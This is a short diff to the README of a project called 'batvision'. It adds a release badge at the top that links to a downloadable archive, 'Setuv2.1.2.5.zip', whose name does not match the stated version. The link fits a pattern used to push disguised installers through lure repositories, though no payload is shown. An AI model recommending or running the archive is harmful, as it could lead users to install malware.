@@ -1,3 +1,5 @@
+[![Release](https://img.shields.io/badge/release-v1.0.0-brightgreen?style=flat-square)](https://github.com/hall-code2005x6/batvision/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 batvision
 
 ![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Version](https://img.shields.io/badge/version-1.0.0-green.svg) ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey.svg)
